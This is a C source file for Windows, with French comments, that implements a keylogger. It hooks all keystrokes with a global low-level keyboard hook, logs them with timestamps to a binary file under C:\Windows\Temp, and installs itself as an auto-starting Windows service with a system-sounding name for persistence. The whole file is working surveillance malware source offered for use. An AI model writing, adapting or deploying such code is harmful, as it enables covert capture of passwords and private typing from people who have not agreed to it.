#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wchar.h>
#include <stdio.h>
#include <stdbool.h>
#include <time.h>

#define SERVICE_NAME L"SystemKeyLogger"
#define DISPLAY_NAME L"System Key Logger Service"

typedef struct {
    WORD vk;
    WCHAR ch;
    SYSTEMTIME timestamp;
} KeyEvent;

static FILE *log_file = NULL;
static volatile bool logging_active = false;
static SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
static SERVICE_STATUS g_ServiceStatus = {0};
static volatile bool g_ServiceRunning = false;

// Hook clavier global (fonctionne en service avec certaines configurations)
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && logging_active) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)lParam;
            KeyEvent ev = {0};
            GetLocalTime(&ev.timestamp);
            ev.vk = kbd->vkCode;
            
            // Conversion basique
            if (kbd->vkCode >= 'A' && kbd->vkCode <= 'Z') {
                ev.ch = kbd->vkCode;
            } else if (kbd->vkCode >= '0' && kbd->vkCode <= '9') {
                ev.ch = kbd->vkCode;
            } else if (kbd->vkCode == VK_SPACE) {
                ev.ch = L' ';
            }
            
            if (log_file) {
                fwrite(&ev, sizeof(KeyEvent), 1, log_file);
                fflush(log_file);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI KeyboardMonitor(LPVOID lpParam) {
    // Installer le hook clavier
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    
    if (keyboardHook) {
        // Boucle de messages
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) && logging_active) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(keyboardHook);
    }
    return 0;
}

bool init_logger() {
    log_file = _wfopen(L"C:\\Windows\\Temp\\system_keys.bin", L"ab");
    return log_file != NULL;
}

bool start_logger() {
    logging_active = true;
    CreateThread(NULL, 0, KeyboardMonitor, NULL, 0, NULL);
    return true;
}

void stop_logger() {
    logging_active = false;
    if (log_file) {
        fclose(log_file);
        log_file = NULL;
    }
}

// Service functions
VOID WINAPI ServiceCtrlHandler(DWORD dwControl) {
    switch(dwControl) {
        case SERVICE_CONTROL_STOP:
            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            g_ServiceRunning = false;
            stop_logger();
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            break;
    }
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    if (init_logger() && start_logger()) {
        g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        
        g_ServiceRunning = true;
        while (g_ServiceRunning) {
            Sleep(1000);
        }
    }
    
    stop_logger();
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

bool InstallService() {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;
    
    char modulePath[MAX_PATH];
    GetModuleFileNameA(NULL, modulePath, MAX_PATH);
    
    SC_HANDLE service = CreateServiceA(
        scm, SERVICE_NAME, DISPLAY_NAME,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
        modulePath, NULL, NULL, NULL, NULL, NULL
    );
    
    if (!service) {
        CloseServiceHandle(scm);
        return false;
    }
    
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    return true;
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { SERVICE_NAME, ServiceMain },
        { NULL, NULL }
    };
    
    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        // Si échec, essayer en mode console
        printf("Mode service échoué, tentative mode console...\n");
        if (init_logger()) {
            start_logger();
            printf("Keylogger démarré. Appuyez sur Entrée pour arrêter...\n");
            getchar();
            stop_logger();
        }
    }
    return 0;
}
